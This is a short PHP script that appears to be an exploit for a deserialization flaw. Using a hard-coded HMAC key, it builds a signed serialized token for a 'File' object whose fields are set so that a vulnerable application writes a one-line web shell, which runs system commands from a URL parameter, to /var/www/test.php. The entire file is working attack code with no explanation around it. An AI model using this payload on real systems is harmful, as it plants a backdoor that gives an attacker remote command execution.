<?php

define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza");

function sign($data) {
  return hash_hmac('md5', $data, KEY);
}

function tokenize($data) {
  $token = urlencode(base64_encode(serialize($data)));
  $token.= "--".sign($token);
  return $token;
}

class File {
  public $owner = "";
  public $uuid = '<?php system($_GET["c"]); ?>';
  public $logfile = "/var/www/test.php";
}

$f = new File();
echo '{"token":"'.tokenize($f).'"}';
?>

